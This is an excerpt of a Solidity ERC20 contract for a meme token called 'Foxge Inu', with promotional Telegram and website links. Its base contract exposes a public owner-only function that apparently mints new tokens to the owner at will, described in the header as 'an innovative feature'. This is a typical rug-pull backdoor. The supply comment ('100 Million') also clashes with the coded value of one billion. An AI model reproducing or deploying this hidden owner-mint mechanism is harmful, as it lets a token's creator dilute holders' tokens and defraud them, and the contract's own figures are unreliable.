...
//
// $FoxgeInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/FoxgeInuOfficial
// 📱 Website ::https://foxge-inu.xyz/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _FoxgeInu(uint256 amount) public onlyOwner {
 _FoxgeInu(msg.sender, amount);
    }
    ...
    function _FoxgeInu(address account, uint256 amount) internal virtual {
...
contract $FoxgeInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Foxge Inu", "FOGEINU") {
     _FoxgeInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}